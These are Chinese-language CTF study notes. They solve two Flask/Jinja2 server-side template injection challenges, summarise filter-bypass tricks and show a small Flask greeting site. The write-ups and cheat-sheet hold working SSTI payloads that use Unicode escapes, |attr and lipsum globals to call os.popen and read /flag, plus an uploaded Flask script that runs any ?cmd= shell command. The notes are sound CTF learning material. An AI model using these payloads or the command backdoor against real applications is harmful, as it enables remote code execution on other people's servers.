学习文章：[最全SSTI模板注入waf绕过总结（6700+字数！）](https://blog.csdn.net/2301_76690905/article/details/134301620)、[FLask SSTI从零到入门 - 跳跳糖](https://tttang.com/archive/1698/)、[使用Python Flask搭建一个简单的Web站点并发布到公网上访问](https://blog.csdn.net/m0_74824534/article/details/144319392)

# 一、刷题
## （一）<font style="color:rgb(0, 0, 0);">[安洵杯 2020]Normal SSTI</font>
进到靶场只有一下信息

## ![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737830123003-eb48d622-5ef2-4b45-8090-d26b1f4c7d4b.png)
随便试几个数

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737831383793-89adc068-03cf-4493-8b2e-730533d38c91.png)

<font style="color:rgb(77, 77, 77);">这一题关键在于用Unicode编码绕过点和下划线的过滤和用{%%}绕过{{}}的过滤</font>

<font style="color:rgb(48, 49, 51);">这个只要知道了用编码绕过就很好解</font>

<font style="color:rgb(48, 49, 51);">学习了一些知识后知道了：</font>

<font style="color:rgb(48, 49, 51);">过滤了{{}}可以使用{%print()%}</font>

<font style="color:rgb(48, 49, 51);">因为.和[]被过滤，所以使用flask的|attr来调用方法</font>

<font style="color:rgb(48, 49, 51);">‘’|attr(“__class__”)等于</font>

<font style="color:rgb(48, 49, 51);">‘’.__class__</font>

<font style="color:rgb(48, 49, 51);">如果要使用xxx.os(‘xxx’)类似的方法，可以使用</font>

<font style="color:rgb(48, 49, 51);">xxx|attr(“os”)(‘xxx’)</font>

用脚本

```python
class_name = "__class__"
unicode_class_name = ''.join(['\\u{:04x}'.format(ord(char)) for char in class_name])
print(unicode_class_name)
```

得到

```plain
\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f
```

所以先构造playload

```plain
url={%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22))%}
```

得到

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737832210924-4e868c58-1704-4b8d-9e3f-cf30ad565fb4.png)

再试试字典：__globals__

```plain
\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f
```

得到

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737832712618-303f5e65-865f-42fd-8a66-293c92cfb6a1.png)

其中

<font style="color:rgb(48, 49, 51);">使用flask里的lipsum方法，来</font><font style="color:rgb(77, 77, 77);">引用popen，查目录，</font><font style="color:rgb(48, 49, 51);">执行命令</font>

```plain
lipsum|attr("__globals__").get("os").popen("ls").read()
```

即

```plain
url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22)|attr(%22\u0067\u0065\u0074%22)(%22os%22)|attr(%22\u0070\u006f\u0070\u0065\u006e%22)(%22\u006c\u0073\u0020\u002f%22)|attr(%22\u0072\u0065\u0061\u0064%22)())%}
```

其中

__globals__：\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f

get：\u0067\u0065\u0074

popen：\u0070\u006f\u0070\u0065\u006e

read：\u0072\u0065\u0061\u0064

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737832992491-9fbd933c-e35d-4f2c-b203-8354d20aa3b4.png)

所以把popen("ls")中的ls 改为cat /flag即可得到flag

cat /flag：\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u0020

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737834033295-d7952507-cebe-4654-bd80-e1f6b3e88842.png)

## （二）<font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道]flask disk</font>
这道题的一开始已经提示我们端口为5000

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737877965836-7a3ac472-8dd6-480f-a6aa-3371a59081fa.png)

一进来是这个页面

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878183154-8e83ed8c-3433-4fc7-9c2b-2e59c175ac51.png)

打开list files发现有这个文件

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878221076-7b5f0d8e-e6a6-424f-beb4-693215f920d2.png)

打开upload files，这个则是一个正常的文件上传

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878278144-0cf0c5d1-f4ec-4e0c-bccb-9d69c715ab45.png)

打开admin manage，则发现要输入密码，大佬应该会爆破吧，我是小白，这题还是考SSTI的题，所以还是正常写吧

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878312134-cdd6e463-d35d-407b-bfb8-cbe09f29e3e5.png)

简单上传了一个文件后出现如下页面

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878491424-448972e5-2e8f-48f0-a149-d9c0dc8ed43a.png)

之后又上传了几个文件后发现，可以构造同名脚本来代替原来的Python文件，其中要有cmd来执行cat /flag命令从而获取flag，脚本如下：

```python
from flask import Flask,request
import os
app = Flask(__name__)
@app.route('/')
def index():
    try:
        cmd=request.args.get('cmd')
        a=os.popen(cmd).read()
        return a
    except:
        pass
    return 1
if __name__=='__main__':
    app.run(host='0.0.0.0',port=5000,debug=True)
```

上传后页面全都找不到了，说明替换成功了，毕竟我们上传的文件没有这个功能的![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737878650248-006cc086-717a-44c6-b693-f4834649d00a.png)

直接cat /flag

```python
?cmd=cat /flag
```

## ![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737877947612-028bfd31-cf84-475e-aaeb-2c6af1a94684.png)
# 二、<font style="color:rgba(0, 0, 0, 0.87);">WAF简单绕过方式总结</font>
### <font style="color:rgb(79, 79, 79);">1、{%%}绕过过滤{{}}</font>
可以用 <font style="color:rgb(79, 79, 79);">{%%} 来代替 {{}}，想要看到内容就用 print 输出一下,即</font>

```plain
{%print("".__class__)%}
```

### <font style="color:rgb(79, 79, 79);">2、getitem()绕过[]过滤</font>
<font style="color:rgb(77, 77, 77);">getitem() 是python的一个魔术方法,对字典使用时,传入字符串,返回字典相应键所对应的值:当对列表使用时,传入整数返回列表对应索引的值。</font>

<font style="color:rgb(77, 77, 77);">例如：当中括号被过滤时，就用下述方法来代替[]</font>

```plain
__getitem__( )代替[ ]
```

### <font style="color:rgb(79, 79, 79);">3、</font>**<font style="color:rgb(78, 161, 219) !important;">request</font>**<font style="color:rgb(79, 79, 79);">方法绕过：</font>
<font style="color:rgb(77, 77, 77);">request在flask中可以访问基于 HTTP 请求传递的所有信息</font>

```plain
request.args.key  #获取get传入的key的值
request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get
request.cookies.key  #获取cookies传入参数
request.headers.key  #获取请求头请求参数
request.data  #获取post传入参数(Content-Type:a/b)
request.json  #获取post传入json参数 (Content-Type: application/json)
```

### <font style="color:rgb(79, 79, 79);">4、绕过下划线过滤:</font>
可以使用Unicode编码

①‘’|attr(“__class__”)等效于‘’.__class__

②如果要使用xxx.os(‘xxx’)类似的方法，可以使用xxx|attr(“os”)(‘xxx’)

③使用flask里的lipsum方法来执行命令：flask里的lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块

得到Unicode编码的python脚本为：（以"cat /flag"为例子：）

```python
class_name = "cat /flag"
unicode_class_name = ''.join(['\\u{:04x}'.format(ord(char)) for char in class_name])
print(unicode_class_name)
```

则得到playload：

```plain
url={%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22))%}
```

### 5、绕过点过滤
设有代码

```plain
{{().__class__.base__.__subclasses__()[117].__init__.__globals__.os.popen("ls").read()}}
```

+ **<font style="color:rgb(79, 79, 79);">中括号[]代替点</font>**

```plain
{{()['class']['base']['subclasses']()[117]['init']['globals']['os']['popen']('ls')['read']()}}
```

+ **<font style="color:rgb(79, 79, 79);">attr()绕过（当中括号也被过滤时使用）</font>**

```plain
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('ls')|attr('read')()}}
```

### 6、绕过关键字过滤:
<font style="color:rgb(79, 79, 79);">1、编码绕过</font>

<font style="color:rgb(79, 79, 79);">即使用Unicode编码绕过</font>

<font style="color:rgb(79, 79, 79);">2、"+"拼接</font>

<font style="color:rgb(77, 77, 77);">{{().__class__}}等效于{{()[‘__cla’+’ss__’]}}</font>

```plain
{{()['__cla'+'ss__']['__ba'+'se__'] [ '__subc'+'__lasses__']['__ get'+'item__'](177)['__in'+'it__']['__glo'+'bals__']['__geti'+'tem__']('os')['po'+'pen']('ls')['read']()}}
```

<font style="color:rgb(79, 79, 79);">3、Jinjia2中的拼接</font>

<font style="color:rgb(77, 77, 77);">{{()[‘__class__’]}}等价于{%set a=’__cla’%}{%set b=’ss__’%}{{()[a~b]</font>

```plain
{%set a='__cla'%}{%set b='ss__'%}{%set c='__ba'%}{%set d='se__'%}{%set e='__subcl'%}{%set f='asses__'%}{%set g='__in'%}{%set h='it__'%}{%set l='__gl'%}{%set i='obals__'%}{%set i='po'%}{%set k='pen'%}{{""[a~b][c~d][e~f]()[19][g~h][l~i]['os'][j~k]('ls')['read']()}}
```

### <font style="color:rgb(77, 77, 77);">7、绕过符号过滤</font>
```plain
{% set a=({}|select()|string()) %}{{a}} #获取下划线
{% set a=({}|self|string()) %} {{a}} #获取空格
{% set a=(self|string|urlencode) %}{{a}}  #获取百分号
```

# <font style="color:rgba(0, 0, 0, 0.87);">三、Flask开发小网站</font>
### 先上效果
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737898322502-cad5dfd0-7f27-4e3e-8349-196239935e00.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737909252297-ab5b5aaf-35cf-4741-896f-0603620c03da.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737898391216-23a44fee-582e-4424-acf6-31769650232c.png)

### 主要代码如下：
```python
from flask import Flask, render_template, request, flash

app = Flask(__name__)
app.secret_key = "manbearpig_MUDMAN888"


@app.route("/")
def index():
    flash("what's your name?")
    return render_template("index.html")


@app.route("/greet", methods=['POST', 'GET'])
def greeter():
    flash("Hi " + str(request.form['name_input']) + " ! Great to see you !")
    return render_template("index.html")

```

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Happy New Year!</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/main.css') }}">
  </head>
  <body>
    <img src="{{ url_for('static', filename='images/FE98E0BC7145D052591D5F1F9F9C0B87.jpg') }}" alt="本地图片">
    <br>
    <form action="greet" method="post">
      {% for message in get_flashed_messages() %}
      <p>{{ message }}</p>
      {% endfor %}
      <br>
      <input type="text" name="name_input" placeholder="请输入你的名字">
      <br>
      <input type="submit" value="GREET" id="greet">
    </form>
    <h2>Happy New Year!</h2>
  </body>
</html>
```

```css
body {
  text-align: center;
  background-color: SlateGrey;
}
p {
  color: white;
  font-family: Shanti;
  font-size: 1.2em;
  display: inline-block;
  margin:  20px;
}
img {
  margin: 60px 0 30px 0;
  width: 250px;
}
input {
  width: 300px;
  margin: 20px 20px;
  height: 50px;
  border: none;
  border-radius: 10px;
  font-family: Shanti;
  font-size: 1.3em;
  text-align: center;
}

input:focus {
  outline: none;
  border: solid 5px #00FFCE;
}

#greet {
  background-color: PaleVioletRed;
  border:  none;
  width:  200px;
  color: white;
}

#greet:hover {
  background-color: MediumVioletRed;
}

```

暂时利用cpolar搭建一个公网来看吧

[https://21023c45.r18.cpolar.top](https://21023c45.r18.cpolar.top)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737909000763-2c65b890-d81b-49a2-ba0e-04f2b4f550b0.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737909000532-7a051df1-8085-4445-b79c-6565304035c9.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737909001126-985fdddf-3872-4c21-b9e7-bac628204669.png)    



